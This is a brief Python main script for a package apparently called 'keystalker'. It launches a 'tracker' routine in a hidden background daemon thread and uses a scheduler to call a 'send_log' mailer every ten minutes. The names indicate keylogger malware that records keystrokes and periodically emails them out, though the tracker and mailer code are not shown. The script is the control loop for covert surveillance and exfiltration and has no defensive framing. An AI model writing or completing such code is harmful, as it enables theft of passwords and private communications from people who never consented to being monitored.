from keystalker.actions.tracker import start
from keystalker.actions.mailer import send_log
from threading import Thread
from apscheduler.schedulers.blocking import BlockingScheduler




def main():
    tracker_thread = Thread(target=start, daemon=True)
    tracker_thread.start()
    scheduler = BlockingScheduler()
    scheduler.add_job(
        send_log,
        trigger="interval",
        minutes=10,
        max_instances=1,
        coalesce=True
    )

    scheduler.start()

if __name__ == "__main__":
    main()
